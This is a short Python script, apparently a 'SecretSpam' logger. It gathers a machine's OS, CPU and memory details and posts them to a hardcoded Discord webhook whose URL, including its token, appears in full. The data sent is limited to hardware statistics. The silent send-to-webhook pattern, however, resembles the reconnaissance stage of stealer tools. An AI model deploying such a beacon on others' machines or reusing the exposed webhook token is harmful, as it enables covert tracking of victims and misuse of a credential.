import platform
import psutil
import requests

def get_system_info():
    try:
        system_info = {
            "Sistema Operacional": f"{platform.system()} {platform.version()}",
            "Arquitetura do Processador": platform.architecture()[0],
            "CPU Lógica": psutil.cpu_count(logical=True),
            "CPU Física": psutil.cpu_count(logical=False),
            "Uso da CPU (%)": psutil.cpu_percent(),
            "Uso de Memória (%)": psutil.virtual_memory().percent,
            "Total de RAM": f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB",
            "RAM Disponível": f"{psutil.virtual_memory().available / (1024 ** 3):.2f} GB",
            "RAM Usada": f"{psutil.virtual_memory().used / (1024 ** 3):.2f} GB"
        }
        return system_info
    except:
        return None

def format_message(system_info):
    if system_info is None:
        return "Desculpe, não foi possível obter informações completas."

    emojis = {
        "Sistema Operacional": "💻",
        "Arquitetura do Processador": "🧠",
        "CPU Lógica": "🔢",
        "CPU Física": "🔢",
        "Uso da CPU (%)": "📈",
        "Uso de Memória (%)": "📈",
        "Total de RAM": "🧮",
        "RAM Disponível": "🧮",
        "RAM Usada": "🧮"
    }

    color_code = 65280 

    formatted_message = "**Logs SecretSpam**\n"

    for key, value in system_info.items():
        formatted_message += f"{emojis.get(key, '')} **{key}:** {value}\n"

    return formatted_message

def send_message(webhook_url, message):
    try:
        payload = {
            "embeds": [
                {
                    "title": "🔎 - Logs SecretSpamer",
                    "description": message,
                    "color": 65280 
                }
            ]
        }
        requests.post(webhook_url, json=payload)
    except:
        return "Desculpe, não foi possível enviar a mensagem."

if __name__ == "__main__":
    system_info = get_system_info()

    message = format_message(system_info)
    webhook_url = "https://discord.com/api/webhooks/1204891971748106250/sTcUux4b7nXO0q2dcp0_j3z5UiuDzaoZtM7-u1m7JMj4-HcfNPzKseDP_n0nuOkG15wN" # coloque o seu webhook aqui
    send_message(webhook_url, message)
